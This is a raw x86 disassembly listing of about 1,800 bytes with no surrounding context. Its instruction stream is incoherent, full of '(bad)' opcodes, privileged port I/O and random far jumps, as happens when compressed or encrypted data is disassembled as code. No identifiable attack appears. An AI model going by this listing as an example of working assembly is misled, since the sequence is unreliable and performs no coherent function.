  422de8:	cmp    DWORD PTR [ecx-0x4f26a5a4],edx
  422dee:	pop    ss
  422def:	(bad)  
  422df0:	dec    esi
  422df1:	mov    ch,0x38
  422df3:	pusha  
  422df4:	data16 sub al,0xc5
  422df7:	jg     0x422e5e
  422df9:	call   0x1b456a72
  422dfe:	jmp    0x422d9d
  422e00:	adc    DWORD PTR [esi],esp
  422e02:	std    
  422e03:	lods   al,BYTE PTR ds:[esi]
  422e04:	sbb    DWORD PTR [eax-0x2a],esi
  422e07:	icebp  
  422e08:	(bad)  [ebx]
  422e0a:	mov    BYTE PTR [ebx+0x4175ea71],dl
  422e10:	dec    ecx
  422e11:	jmp    0x1c8f:0x211474cf
  422e18:	ds inc ebp
  422e1a:	out    0x45,eax
  422e1c:	inc    ebx
  422e1d:	add    DWORD PTR [ebp+0x660be189],ecx
  422e23:	clc    
  422e24:	adc    eax,0xdfc9a54f
  422e29:	(bad)  
  422e2a:	js     0x422eab
  422e2c:	adc    ch,BYTE PTR [esi+0x5f01892e]
  422e32:	fld    TBYTE PTR [ebx-0x47]
  422e35:	in     eax,dx
  422e36:	adc    DWORD PTR [edi+0x35242ac6],0x41
  422e3d:	repnz cmp al,0x5
  422e40:	imul   eax,DWORD PTR [ebp+0x23],0xf2c30325
  422e47:	hlt    
  422e48:	addr16 clc 
  422e4a:	retf   0x74f2
  422e4d:	(bad)  
  422e4e:	(bad)  
  422e4f:	xchg   ebp,eax
  422e50:	test   ebp,esp
  422e52:	js     0x422e4d
  422e54:	fwait
  422e55:	cmp    BYTE PTR [ecx+0x5c],dh
  422e58:	jmp    0xb36:0x8ff78325
  422e5f:	pop    eax
  422e60:	jmp    0x7aaa:0xed4bffee
  422e67:	add    eax,0x1950d45
  422e6c:	lods   eax,DWORD PTR ds:[si]
  422e6e:	loope  0x422e2f
  422e70:	cld    
  422e71:	jo     0x422e1a
  422e73:	pop    ds
  422e74:	push   edi
  422e75:	dec    edx
  422e76:	clc    
  422e77:	aaa    
  422e78:	inc    esi
  422e79:	ret    0x9d19
  422e7c:	jno    0x422e50
  422e7e:	nop
  422e7f:	push   ebx
  422e80:	out    0xb1,al
  422e82:	push   esp
  422e83:	mov    edi,0x7b25ac1d
  422e88:	leave  
  422e89:	popf   
  422e8a:	(bad)  
  422e8b:	mov    edi,0x204ddc91
  422e90:	sahf   
  422e91:	pop    ds
  422e92:	dec    edx
  422e93:	xor    BYTE PTR [ecx+0x5fef150e],dl
  422e99:	mov    dh,0x99
  422e9b:	loop   0x422eb4
  422e9d:	mov    dh,0x95
  422e9f:	xor    al,0x20
  422ea1:	pop    esi
  422ea2:	sbb    ah,bh
  422ea4:	jae    0x422f0f
  422ea6:	mov    ah,0xd4
  422ea8:	jmp    0x1c38:0x1999942f
  422eaf:	pop    eax
  422eb0:	dec    edx
  422eb1:	pop    esi
  422eb2:	enter  0x2600,0xbe
  422eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eb7:	cwde   
  422eb8:	mov    WORD PTR [ebp-0x32],es
  422ebb:	or     ah,BYTE PTR [ecx+0x61]
  422ebe:	and    ch,dh
  422ec0:	ret    0x8244
  422ec3:	cmp    eax,0xb0f0a530
  422ec8:	pop    es
  422ec9:	cwde   
  422eca:	les    esp,FWORD PTR [ebx+0x440edb07]
  422ed0:	(bad)  
  422ed1:	jae    0x422ec6
  422ed3:	imul   ecx
  422ed5:	add    al,0xd8
  422ed7:	xor    al,0xf9
  422ed9:	add    ecx,esp
  422edb:	push   ebp
  422edc:	test   esi,ecx
  422ede:	inc    esi
  422edf:	add    eax,0xb6b6b6b7
  422ee4:	stos   BYTE PTR es:[edi],al
  422ee5:	inc    eax
  422ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ee7:	jp     0x422f04
  422ee9:	jbe    0x422ec5
  422eeb:	shl    BYTE PTR [esi-0x6aea56a4],cl
  422ef1:	aas    
  422ef2:	in     eax,0xba
  422ef4:	dec    edx
  422ef5:	(bad)  
  422ef6:	ret    
  422ef7:	adc    BYTE PTR ds:0xaab4497,al
  422efd:	push   esp
  422efe:	push   edx
  422eff:	inc    ecx
  422f00:	aam    0xde
  422f02:	lea    ebx,[esi+0x1]
  422f05:	aam    0xfd
  422f07:	pop    ebx
  422f08:	sahf   
  422f09:	arpl   WORD PTR [eax+0x60f7fa25],si
  422f0f:	test   al,0xd4
  422f11:	lock adc ecx,DWORD PTR [ebx+0x26b3c1c]
  422f18:	adc    DWORD PTR [ebx-0xdcf9bcc],edi
  422f1e:	xor    DWORD PTR [edx+0x71f96970],edi
  422f24:	test   al,0xa3
  422f26:	fstp   TBYTE PTR [edx-0x72e95d5b]
  422f2c:	inc    ebx
  422f2d:	xor    DWORD PTR ds:0x282103ae,eax
  422f33:	sbb    esp,DWORD PTR [esi]
  422f35:	mov    dh,0xa3
  422f37:	inc    esi
  422f38:	popf   
  422f39:	mov    ds:0x87f942c8,al
  422f3e:	sub    ch,dl
  422f40:	scas   eax,DWORD PTR es:[edi]
  422f41:	mov    esp,0xf888d0e2
  422f46:	data16 mov bh,0x40
  422f49:	mov    WORD PTR [ecx],ss
  422f4b:	int3   
  422f4c:	push   ebp
  422f4d:	fwait
  422f4e:	add    BYTE PTR [esi-0x6a],cl
  422f51:	lahf   
  422f52:	out    dx,al
  422f53:	inc    edx
  422f54:	jmp    0xdb106041
  422f59:	xor    al,0xe4
  422f5b:	push   es
  422f5c:	sub    eax,0x30d0836f
  422f61:	jne    0x422f0a
  422f63:	dec    esp
  422f64:	lods   al,BYTE PTR ds:[esi]
  422f65:	jne    0x422f06
  422f67:	sbb    BYTE PTR [edi+0x7c82622f],ah
  422f6d:	inc    ebx
  422f6e:	out    dx,eax
  422f6f:	clc    
  422f70:	lods   al,BYTE PTR ds:[esi]
  422f71:	mov    eax,0xcde05a99
  422f76:	push   edi
  422f77:	rol    DWORD PTR [edx+ecx*4+0x46135539],1
  422f7e:	xor    BYTE PTR ds:0x452b464a,bh
  422f84:	mov    cs,WORD PTR [ecx+0x72bf3452]
  422f8a:	pop    eax
  422f8b:	xor    BYTE PTR [ecx],bh
  422f8d:	sub    edx,ebx
  422f8f:	jne    0x422fb5
  422f91:	jg     0x422f40
  422f93:	mov    edi,0xe867c5ae
  422f98:	fadd   st(7),st
  422f9a:	adc    DWORD PTR [eax-0x46],ecx
  422f9d:	inc    esi
  422f9e:	and    ebp,DWORD PTR [edi-0x27]
  422fa1:	outs   dx,DWORD PTR ds:[esi]
  422fa2:	xlat   BYTE PTR ds:[ebx]
  422fa3:	mov    ebx,0xf0999acb
  422fa8:	in     al,0xa5
  422faa:	sub    bl,BYTE PTR [ebx+eax*4-0xd0bcc59]
  422fb1:	neg    BYTE PTR [eax]
  422fb3:	lods   al,BYTE PTR ds:[esi]
  422fb4:	das    
  422fb5:	mov    cl,0x25
  422fb7:	xor    BYTE PTR [eax-0x12],dl
  422fba:	xchg   DWORD PTR ds:0x242f0378,ebp
  422fc0:	lea    edi,[esi-0x1e]
  422fc3:	fisub  DWORD PTR [ebx]
  422fc5:	cli    
  422fc6:	or     eax,DWORD PTR [eax+0x25c074c5]
  422fcc:	mov    ah,0x47
  422fce:	arpl   sp,sp
  422fd0:	sbb    eax,0x6878c69f
  422fd5:	adc    eax,0xd46bb97c
  422fda:	inc    edi
  422fdb:	jne    0x422fa8
  422fdd:	nop
  422fde:	xlat   BYTE PTR ds:[ebx]
  422fdf:	rol    dh,1
  422fe1:	mov    DWORD PTR [ebp+0x7aa5124b],ebx
  422fe7:	(bad)  
  422fe8:	pop    edx
  422fe9:	fwait
  422fea:	std    
  422feb:	ret    0x4b96
  422fee:	mov    bh,0x73
  422ff0:	cdq    
  422ff1:	repnz push 0x57
  422ff4:	aaa    
  422ff5:	shl    BYTE PTR [edx+0x7a],0x97
  422ff9:	icebp  
  422ffa:	(bad)  
  422ffb:	icebp  
  422ffc:	out    dx,al
  422ffd:	shl    DWORD PTR [edi-0xa],cl
  423000:	out    dx,eax
  423001:	lahf   
  423002:	add    bl,al
  423004:	js     0x42302f
  423006:	pop    ds
  423007:	fcomp  st(4)
  423009:	xchg   esp,eax
  42300a:	loop   0x423073
  42300c:	mov    eax,0x447ffcb2
  423011:	xchg   ebx,eax
  423012:	out    dx,eax
  423013:	mov    edi,0x9535b0
  423018:	jne    0x422fe1
  42301a:	or     DWORD PTR [edx-0x62],esi
  42301d:	xchg   ebp,eax
  42301e:	mov    cs,WORD PTR [eax]
  423020:	pop    ebx
  423021:	push   es
  423022:	imul   ebp,DWORD PTR [esi],0x3a31eaf1
  423028:	push   esp
  423029:	push   0x16
  42302b:	jne    0x423002
  42302d:	retf   0xc131
  423030:	push   edx
  423031:	sbb    al,0xae
  423033:	cs arpl cx,bp
  423036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423037:	pusha  
  423038:	sbb    esi,DWORD PTR [edx+0x1d]
  42303b:	stc    
  42303c:	imul   ecx,DWORD PTR [edx+0x5aba904],0x11
  423043:	sub    edi,DWORD PTR [ecx-0x2c]
  423046:	js     0x423026
  423048:	sbb    eax,0x82cdcaaa
  42304d:	xchg   DWORD PTR [ebx],ebp
  42304f:	xchg   ebx,eax
  423050:	mov    ds,esp
  423052:	loop   0x423078
  423054:	jp     0x42302e
  423056:	jnp    0x42302b
  423058:	imul   esi,DWORD PTR [edi-0x1208c8d4],0x7f
  42305f:	aas    
  423060:	mov    WORD PTR [esi+0x5c98175c],?
  423066:	jl     0x423046
  423068:	jae    0x423094
  42306a:	rcl    cl,cl
  42306c:	mov    DWORD PTR [eax+0x3f42cf57],edx
  423072:	adc    DWORD PTR [ecx+ecx*2+0xd],esi
  423076:	pop    es
  423077:	imul   edi,eax,0x118730ef
  42307d:	mov    ah,0x21
  42307f:	sar    BYTE PTR [edi],cl
  423081:	and    eax,DWORD PTR [esi+0x213472b3]
  423087:	or     al,0xb3
  423089:	mov    bl,0xee
  42308b:	mov    eax,ds:0x51d9f693
  423090:	fild   DWORD PTR [eax+0x1a]
  423093:	sbb    DWORD PTR [edx+0x5d53f84c],ebx
  423099:	out    0xb9,al
  42309b:	ffree  st(0)
  42309d:	aam    0xb
  42309f:	pop    ebx
  4230a0:	outs   dx,BYTE PTR ds:[esi]
  4230a1:	std    
  4230a2:	mov    bh,0xdd
  4230a4:	push   edi
  4230a5:	cs pop ds
  4230a7:	das    
  4230a8:	icebp  
  4230a9:	xchg   ebp,eax
  4230aa:	and    al,0x45
  4230ac:	je     0x42306a
  4230ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230af:	imul   ebx,ebp,0x6c5bd5da
  4230b5:	and    edi,eax
  4230b7:	jno    0x423103
  4230b9:	pop    eax
  4230ba:	and    dh,BYTE PTR [edi+0x53]
  4230bd:	xor    ebp,eax
  4230bf:	dec    edi
  4230c0:	mov    ds:0x3c71e712,eax
  4230c5:	add    dh,BYTE PTR [ebx+esi*4+0x56ecbbd7]
  4230cc:	inc    esi
  4230cd:	jmp    0xe119:0x52d34440
  4230d4:	loopne 0x423150
  4230d6:	repnz adc al,0xc
  4230d9:	xor    BYTE PTR [ebx-0x3bd46c96],ah
  4230df:	inc    esi
  4230e0:	je     0x4230b1
  4230e2:	xor    eax,0xbb92f418
  4230e7:	xchg   ecx,eax
  4230e8:	jmp    0x423129
  4230ea:	mov    esi,0x5cab258b
  4230ef:	push   ecx
  4230f0:	rol    BYTE PTR [ecx-0x5aca7759],1
  4230f6:	and    DWORD PTR [ebx-0x6b0c87b9],esi
  4230fc:	sub    eax,0xd88b199
  423101:	push   esi
  423102:	mov    ebp,0x69512e8b
  423107:	dec    ebp
  423108:	pop    esi
  423109:	call   0x5714:0x7e165875
  423110:	dec    ebx
  423111:	mov    fs,esp
  423113:	pop    eax
  423114:	les    eax,FWORD PTR [eax-0x434e3ab6]
  42311a:	ja     0x4230d5
  42311c:	mov    eax,ds:0xd32a3b12
  423121:	mov    dl,0x2
  423123:	dec    ebx
  423124:	xchg   esp,eax
  423125:	(bad)  
  423127:	loope  0x4230d4
  423129:	lea    ebx,[eax+ecx*4]
  42312c:	not    BYTE PTR [ecx+0xde463c2]
  423132:	jae    0x423197
  423134:	cmp    BYTE PTR [esi-0x2dcc539],0xf2
  42313b:	scas   al,BYTE PTR es:[edi]
  42313c:	pop    ds
  42313d:	cmc    
  42313e:	call   DWORD PTR cs:[ebp+edi*4+0x4c]
  423143:	mov    BYTE PTR [ebp+0x1400b67e],bh
  423149:	jl     0x4230e2
  42314b:	jmp    0x42310d
  42314d:	pop    ss
  42314e:	sub    ebp,DWORD PTR [eax+0x7f0f6c07]
  423154:	add    eax,0x1f8ef292
  423159:	jno    0x4231a3
  42315b:	pop    edx
  42315c:	je     0x42318f
  42315e:	mov    dl,0x57
  423160:	rcl    ebp,1
  423162:	xchg   ecx,eax
  423163:	cmp    al,0xed
  423165:	sub    cl,BYTE PTR [ecx]
  423167:	pop    ebx
  423168:	data16 stos BYTE PTR es:[edi],al
  42316a:	loope  0x4231e6
  42316c:	mov    ebp,DWORD PTR [edx]
  42316e:	push   ecx
  42316f:	push   edx
  423170:	cmp    eax,0xd9ee9464
  423175:	int3   
  423176:	sub    eax,0x6454edee
  42317b:	sub    DWORD PTR [bx+si+0x3c],edi
  42317f:	cmp    BYTE PTR [esi+esi*8],al
  423182:	jbe    0x4231d7
  423184:	imul   esp,ebx,0x421b87d
  42318a:	cmp    esp,DWORD PTR ds:0xd0cb3910
  423190:	retf   0xda9a
  423193:	sbb    DWORD PTR ss:[edi+0x6429bfec],esp
  42319a:	jno    0x423172
  42319c:	in     eax,dx
  42319d:	dec    ebx
  42319e:	js     0x423186
  4231a0:	push   edi
  4231a1:	jmp    0x4231b5
  4231a3:	sahf   
  4231a4:	les    edi,FWORD PTR [eax+0x0]
  4231a7:	sub    ebx,DWORD PTR [eax]
  4231a9:	sub    cl,bl
  4231ab:	xchg   ebx,eax
  4231ac:	nop
  4231ad:	push   es
  4231ae:	or     al,0xe9
  4231b0:	mov    al,ds:0x7c4de77c
  4231b5:	jmp    0xee1:0xb27bdd32
  4231bc:	dec    esp
  4231bd:	and    ch,BYTE PTR [esi]
  4231bf:	inc    edi
  4231c0:	add    ch,BYTE PTR [esi+esi*8+0x48d0fa11]
  4231c7:	and    eax,0x81e0b56b
  4231cc:	adc    DWORD PTR [edx-0x2f],eax
  4231cf:	aaa    
  4231d0:	jl     0x4231fe
  4231d2:	sub    DWORD PTR [ecx],ecx
  4231d4:	xchg   esi,eax
  4231d5:	int    0xd1
  4231d7:	xor    eax,0x33f56c71
  4231dc:	xor    BYTE PTR [ecx+0x178cd62d],0xbd
  4231e3:	pop    ecx
  4231e4:	mov    BYTE PTR [edi-0x2f],ch
  4231e7:	mov    ecx,0xaada0889
  4231ec:	nop
  4231ed:	es push es
  4231ef:	jle    0x42325e
  4231f1:	cmp    eax,0x7fc5a3fc
  4231f6:	dec    ecx
  4231f7:	or     eax,DWORD PTR [eax]
  4231f9:	fimul  DWORD PTR [ecx-0x4f]
  4231fc:	pushf  
  4231fd:	sub    ah,BYTE PTR [edi]
  4231ff:	cmp    al,0x72
  423201:	xor    DWORD PTR ds:0x42b28c04,esi
  423207:	in     al,dx
  423208:	mov    ebp,edx
  42320a:	jle    0x423249
  42320c:	push   esp
  42320d:	call   0xcb335370
  423212:	jns    0x4231f9
  423214:	call   0x1265:0x52c9cef
  42321b:	mov    eax,ds:0x260eaa9f
  423220:	mov    edi,0xad3404b3
  423225:	mov    esp,0x8051c4b6
  42322a:	and    bh,bh
  42322c:	pop    esp
  42322d:	or     ecx,ecx
  42322f:	(bad)  
  423231:	adc    al,0x7d
  423233:	pushf  
  423234:	pop    ecx
  423235:	fdivr  DWORD PTR [eax]
  423237:	push   ecx
  423238:	dec    edx
  423239:	jle    0x4232b5
  42323b:	lahf   
  42323c:	xchg   esi,eax
  42323d:	jbe    0x423211
  42323f:	xor    al,0x87
  423241:	mov    eax,ds:0x40c37340
  423246:	mov    esp,DWORD PTR ds:0x81164a82
  42324c:	popa   
  42324d:	ja     0x4232c7
  42324f:	call   0x89e1c44d
  423254:	(bad)  
  423255:	or     BYTE PTR [edx*4+0x6debb098],cl
  42325c:	pusha  
  42325d:	sahf   
  42325e:	mov    eax,0x76b885af
  423263:	cs clc 
  423265:	xor    eax,0xb4a20c7a
  42326a:	jnp    0x42328a
  42326c:	outs   dx,DWORD PTR ds:[esi]
  42326d:	sbb    BYTE PTR [ebx+0x2e],al
  423270:	clc    
  423271:	fs repz or al,0xbe
  423275:	test   edx,edx
  423277:	fidivr DWORD PTR [eax-0x4c]
  42327a:	adc    eax,DWORD PTR [eax]
  42327c:	pop    esp
  42327d:	add    esi,DWORD PTR [ebx+ebx*1]
  423280:	ss (bad) 
  423282:	frstpm(287 only) 
  423284:	out    dx,eax
  423285:	clc    
  423286:	test   edi,ecx
  423288:	mov    ebx,0x6cf8c270
  42328d:	lds    esi,FWORD PTR [esi-0x1e]
  423290:	sti    
  423291:	or     dh,BYTE PTR [ecx]
  423293:	jns    0x4232fa
  423295:	and    ch,dl
  423297:	in     eax,dx
  423298:	in     eax,dx
  423299:	aad    0x4e
  42329b:	push   0xe
  42329d:	dec    ebx
  42329e:	test   BYTE PTR [eax+0x205635dc],0xc8
  4232a5:	test   ch,ch
  4232a7:	push   ebx
  4232a8:	and    eax,0xddaa8bd0
  4232ad:	jmp    0x423308
  4232af:	cwde   
  4232b0:	add    BYTE PTR [eax+0x5ab527f],bh
  4232b6:	call   0x5836cb42
  4232bb:	mov    ds:0x2ba31f27,al
  4232c0:	hlt    
  4232c1:	jmp    FWORD PTR [edi+0x1f40ab1d]
  4232c7:	dec    ecx
  4232c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232c9:	push   0xe5b987b4
  4232ce:	adc    DWORD PTR [ecx+0xd24205e],ecx
  4232d4:	adc    eax,ebp
  4232d6:	cmp    edx,DWORD PTR [ebp+0x1f]
  4232d9:	or     dh,al
  4232db:	hlt    
  4232dc:	retf   0xd52b
  4232df:	fnstcw WORD PTR [esi]
  4232e1:	(bad)  
  4232e2:	je     0x423267
  4232e4:	(bad)  
  4232e5:	fcom   QWORD PTR [eax-0x31f4ce1e]
  4232eb:	loope  0x4232ab
  4232ed:	jne    0x4232c8
  4232ef:	in     eax,dx
  4232f0:	or     ch,BYTE PTR [edi-0x46]
  4232f3:	daa    
  4232f4:	pop    eax
  4232f5:	xchg   ebx,eax
  4232f6:	(bad)  
  4232f7:	lea    ebp,[esi]
  4232f9:	aad    0x86
  4232fb:	add    eax,edi
  4232fd:	dec    eax
  4232fe:	inc    edx
  4232ff:	or     DWORD PTR [edi],0xf83a7e30
  423305:	rcr    bl,1
  423307:	loope  0x423375
  423309:	dec    esi
  42330a:	mov    ah,0xfd
  42330c:	addr16 add ch,0x10
  423310:	out    dx,al
  423311:	pop    esi
  423312:	push   0xffffff8d
  423314:	repz cmp DWORD PTR ds:0x8a6548ff,esp
  42331b:	cmp    ch,BYTE PTR [eax-0x379fc718]
  423321:	cmp    edi,esi
  423323:	in     al,0x97
  423325:	(bad)  
  423326:	adc    esp,esi
  423328:	retf   0xcabf
  42332b:	lock pushf 
  42332d:	gs jmp 0x7829bf91
  423333:	add    DWORD PTR [esi-0x18],edi
  423336:	repnz pushf 
  423338:	xor    eax,0x3e48d81d
  42333d:	sbb    BYTE PTR [ecx],al
  42333f:	out    0x2c,eax
  423341:	pop    ebp
  423342:	cmp    eax,0xfd2d9201
  423347:	sbb    ecx,DWORD PTR [edx]
  423349:	daa    
  42334a:	lea    ecx,[ebx]
  42334c:	ins    DWORD PTR es:[edi],dx
  42334d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42334e:	dec    esp
  42334f:	(bad)  
  423350:	sbb    eax,0x716036af
  423355:	imul   esp,DWORD PTR [ecx-0x46a4c9b9],0xffffff93
  42335c:	rol    DWORD PTR [eax-0x17],1
  42335f:	xchg   esp,eax
  423360:	dec    esi
  423361:	jecxz  0x42331c
  423363:	rcr    ecx,cl
  423365:	inc    edi
  423366:	push   ebx
  423367:	ret    
  423368:	sahf   
  423369:	pminub mm6,mm3
  42336c:	stos   DWORD PTR es:[edi],eax
  42336d:	mov    dl,0xdb
  42336f:	mov    ch,0x6c
  423371:	test   eax,0xa4c79873
  423376:	cmc    
  423377:	rcr    BYTE PTR [ecx+0xb],cl
  42337a:	dec    esi
  42337b:	mov    bl,al
  42337d:	rcl    DWORD PTR [ebx+0x77],1
  423380:	push   cs
  423381:	jle    0x42334a
  423383:	sbb    dl,ch
  423385:	les    ebx,FWORD PTR [esi+ebx*1-0x7a911578]
  42338c:	lods   eax,DWORD PTR ds:[esi]
  42338d:	jns    0x4233ce
  42338f:	or     DWORD PTR fs:[edi],ebp
  423392:	loopne 0x4233ff
  423394:	and    eax,0xe613e7f6
  423399:	add    dl,BYTE PTR [esp+eax*8+0x4d]
  42339d:	sub    BYTE PTR [esi],ah
  42339f:	shl    esp,1
  4233a1:	mov    edx,ds
  4233a3:	mov    ah,0xd
  4233a5:	std    
  4233a6:	and    eax,0x5316419e
  4233ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233ac:	and    eax,0xa3ea57be
  4233b1:	aas    
  4233b2:	xlat   BYTE PTR ds:[ebx]
  4233b3:	sti    
  4233b4:	rcl    al,cl
  4233b6:	ror    BYTE PTR [edi+0x5c00220a],1
  4233bc:	cmp    al,0x80
  4233be:	jne    0x423416
  4233c0:	dec    esi
  4233c1:	jmp    0x749442d
  4233c6:	sub    dh,ah
  4233c8:	ds inc ebx
  4233ca:	(bad)  
  4233cb:	fimul  WORD PTR fs:[ecx-0x7e]
  4233cf:	rcl    BYTE PTR es:[ebx+0x4a125588],0x62
  4233d7:	xchg   ecx,eax
  4233d8:	scas   al,BYTE PTR es:[edi]
  4233d9:	jmp    0xfbc6f040
  4233de:	mov    ecx,es
  4233e0:	xchg   BYTE PTR [edi+0x4c],bh
  4233e3:	sbb    edi,esi
  4233e5:	stos   DWORD PTR es:[edi],eax
  4233e6:	pop    edx
  4233e7:	(bad)  
  4233e8:	sti    
  4233e9:	xchg   DWORD PTR [esi+edx*4-0x56c06841],ecx
  4233f0:	sbb    BYTE PTR [edi],ch
  4233f2:	ss repz hlt 
  4233f5:	jp     0x4233a2
  4233f7:	ins    DWORD PTR es:[edi],dx
  4233f8:	add    dl,ch
  4233fa:	pop    eax
  4233fb:	rol    DWORD PTR [ecx-0x75],0x5e
  4233ff:	sub    DWORD PTR [edi-0x2225afca],0xca360362
  423409:	lods   eax,DWORD PTR ds:[esi]
  42340a:	and    al,0x64
  42340c:	mov    ecx,0x1d723ff2
  423411:	mov    cs,WORD PTR [esi-0x2f]
  423414:	mov    eax,ds:0xb6b8bc6
  423419:	pop    es
  42341a:	scas   al,BYTE PTR es:[edi]
  42341b:	aaa    
  42341c:	push   ds
  42341d:	test   DWORD PTR [ebx-0x4d],ebx
  423420:	adc    esp,DWORD PTR [edi+0x58]
  423423:	jns    0x423445
  423425:	push   esp
  423426:	mov    esp,0x6900b404
  42342b:	mov    ebp,0x887147f9
  423430:	int3   
  423431:	dec    ecx
  423432:	sub    bh,BYTE PTR [esi+0x3b]
  423435:	in     eax,dx
  423436:	aas    
  423437:	and    ah,BYTE PTR [ebp-0x1d]
  42343a:	es and eax,0xe5147f1a
  423440:	jbe    0x423437
  423442:	push   edx
  423443:	mov    edi,0x2b6c5b33
  423448:	(bad)  
  423449:	retf   0xe1ae
  42344c:	push   cs
  42344d:	aam    0x46
  42344f:	call   0xdeef:0x91f1a469
  423456:	daa    
  423457:	jno    0x4234b2
  423459:	ins    DWORD PTR es:[edi],dx
  42345a:	sub    eax,0x84b55edb
  42345f:	jae    0x42345d
  423461:	js     0x423455
  423463:	out    0x7e,al
  423465:	out    0xcf,al
  423467:	std    
  423468:	mov    edx,0xd1f95f61
  42346d:	adc    DWORD PTR [ecx],ecx
  42346f:	mov    edx,0x581f2855
  423474:	cs addr16 push 0xa
  423478:	or     dl,BYTE PTR [edx-0x1ef4c2dd]
  42347e:	cmp    dh,bh
  423480:	scas   al,BYTE PTR es:[edi]
  423481:	nop
  423482:	ins    BYTE PTR es:[edi],dx
  423483:	das    
  423484:	je     0x423446
  423486:	test   eax,0x5b9f478b
  42348b:	pop    es
  42348c:	int3   
  42348d:	push   ds
  42348e:	pushf  
  42348f:	or     DWORD PTR [ebx],ecx
  423491:	mov    ds:0xd9eb58cc,al
  423496:	push   ecx
  423497:	push   ds
  423498:	lahf   
  423499:	cmp    DWORD PTR [ecx-0x3a],edi
  42349c:	fwait
  42349d:	inc    ecx
  42349e:	imul   edx,DWORD PTR [edi],0x20885375
  4234a4:	test   DWORD PTR [esi+0x19a8bdcf],edi
  4234aa:	int3   
  4234ab:	mov    cl,0x22
  4234ad:	pop    eax
  4234ae:	jo     0x4234b6
  4234b0:	into   
  4234b1:	retf   0x2928
  4234b4:	fs sbb al,0xde
  4234b7:	add    ah,ah
  4234b9:	and    edx,DWORD PTR [edx]
  4234bb:	shl    ecx,1
  4234bd:	jbe    0x423455
  4234bf:	daa    
  4234c0:	dec    esp
  4234c1:	mov    dh,0x3d
  4234c3:	retf   0xf90
  4234c6:	add    esi,DWORD PTR [ecx+0x50]
  4234c9:	test   al,0x63
  4234cb:	push   es
  4234cc:	mov    dh,0xd9
  4234ce:	hlt    
  4234cf:	mov    edx,0x8c0a92a9
  4234d4:	arpl   si,dx
  4234d6:	iret   
  4234d7:	add    DWORD PTR [edx+0x7f275fca],eax
  4234dd:	mov    bl,0xf1
  4234df:	pusha  
  4234e0:	jb     0x423555
  4234e2:	sbb    esp,DWORD PTR [ebx+0x6b4ab7a8]
  4234e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234e9:	sbb    eax,0x8385920d
  4234ee:	xchg   ecx,eax
  4234ef:	stos   BYTE PTR es:[edi],al
  4234f0:	push   0xf4a53863
  4234f5:	jl     0x423516
  4234f7:	push   edi
  4234f8:	scas   al,BYTE PTR es:[edi]
  4234f9:	icebp  
  4234fa:	sub    edi,DWORD PTR [esi+0x5b47a3a5]
  423500:	push   ebx
  423501:	clc    
  423502:	into   
  423503:	mov    bl,0xbd
  423505:	sbb    DWORD PTR [esi-0x17],edi
  423508:	shl    DWORD PTR [edi-0x80],cl
  42350b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42350c:	arpl   WORD PTR [ebp+ecx*1+0x1],si
  423510:	xchg   ecx,eax
  423511:	cmp    al,0x89
  423513:	pusha  
  423514:	lahf   
  423515:	ret    0xbaa7
  423518:	jg     0x4234bb
  42351a:	lds    edi,FWORD PTR [ebx+0x6a76dfa0]
  423520:	push   0x872f2e51
  423525:	jle    0x4234fd
  423527:	lock xchg ebp,eax
  423529:	jecxz  0x4234ba
  42352b:	scas   eax,DWORD PTR es:[edi]
  42352c:	stos   BYTE PTR es:[edi],al
  42352d:	fcmovnb st,st(0)
  42352f:	adc    dl,dh
  423531:	rcr    BYTE PTR ds:0x3334e19b,1
  423537:	or     dh,ch
  423539:	jecxz  0x4234da
  42353b:	js     0x423534
  42353d:	pop    ecx
  42353e:	mov    edi,DWORD PTR [ecx-0x15]
  423541:	dec    esp
  423542:	lods   al,BYTE PTR ds:[esi]
  423543:	lods   eax,DWORD PTR ds:[esi]
  423544:	jmp    0x4234d5
  423546:	push   ebx
  423547:	outs   dx,BYTE PTR ds:[esi]
  423548:	cmp    ch,BYTE PTR [ebx]
  42354a:	test   DWORD PTR [esi],edi
  42354c:	lahf   
  42354d:	inc    eax
  42354e:	mov    esp,0x59658409
  423553:	push   edi
  423554:	dec    edx
  423555:	nop
  423556:	mov    DWORD PTR [ebx+0x61],0x6c2b8156
  42355d:	dec    ebx
  42355e:	xchg   ebp,eax
  42355f:	lea    eax,ds:0x8e469d56
  423565:	leave  
  423566:	jmp    0x5aee:0x36d7ea65
  42356d:	cld    
  42356e:	pop    ebx
  42356f:	pusha  
  423570:	cdq    
  423571:	gs inc esp
  423573:	mov    al,0x47
  423575:	or     DWORD PTR [edi+0x3d02acdb],ebp
  42357b:	lods   eax,DWORD PTR ds:[esi]
  42357c:	lds    edi,FWORD PTR [esi]
  42357e:	imul   ebp,DWORD PTR [ebx],0xffffff8a
  423581:	loop   0x423581
  423583:	mov    ah,0xb6
  423585:	add    al,0x7c
  423587:	xchg   edx,eax
  423588:	mov    esi,0xf1092fe3
  42358d:	cmp    esi,DWORD PTR [edi]
  42358f:	add    ebp,ebx
  423591:	inc    eax
  423592:	ss mov esi,0xbdf00882
  423598:	imul   esp,DWORD PTR [ebp+eax*4-0x11ef15d7],0x51
  4235a0:	jmp    0xef8914b5
  4235a5:	jne    0x4235ac
  4235a7:	push   esp
  4235a8:	adc    BYTE PTR [edx-0x1e],dh
  4235ab:	pop    ds
  4235ac:	imul   edx
  4235ae:	imul   edi,DWORD PTR [edi+0x31a8bebb],0xffffffbe
  4235b5:	xchg   esp,eax
  4235b6:	or     ch,ch
  4235b8:	enter  0xb543,0x86
  4235bc:	(bad)  
  4235bd:	jmp    0x423623
  4235bf:	xchg   ecx,eax
  4235c0:	xor    al,cl
  4235c2:	mov    ebp,0x890cb5a1
  4235c7:	fmul   DWORD PTR [esi+0x53]
  4235ca:	(bad)  
  4235cb:	xchg   edx,eax
  4235cc:	dec    eax
  4235cd:	call   0xae143a54
  4235d2:	xchg   esi,eax
  4235d3:	push   ds
  4235d4:	aad    0xc5
  4235d6:	ror    BYTE PTR [eax-0x14da34bb],cl
  4235dc:	int    0x4f
  4235de:	aaa    
  4235df:	jo     0x4235f4
  4235e1:	into   
  4235e2:	pop    ecx
  4235e3:	dec    ebx
